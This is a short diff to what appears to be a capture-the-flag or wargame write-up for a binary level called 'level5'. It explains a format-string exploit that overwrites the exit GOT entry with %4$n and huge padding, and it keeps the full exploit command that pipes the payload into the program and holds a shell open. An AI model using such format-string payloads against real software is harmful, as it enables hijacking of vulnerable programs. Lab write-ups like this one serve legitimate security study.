@@ -119,13 +119,7 @@ o        = what to write
 %4$n     = write the address to the 4th argument
 %134513824x = fabriquer la valeur 0x080484a4
 ```
-
-
-**Command generation (converter.py):**
-The script `level5/Ressources/converter.py` computes the padding from the addresses (GOT exit, o) and outputs the final command. Typical output:
-`( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5`
-
-**Final command (see `commands.md`, Exploitation section):**
+**Final command (Exploitation section):**
 ```bash
 ( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5
 ```
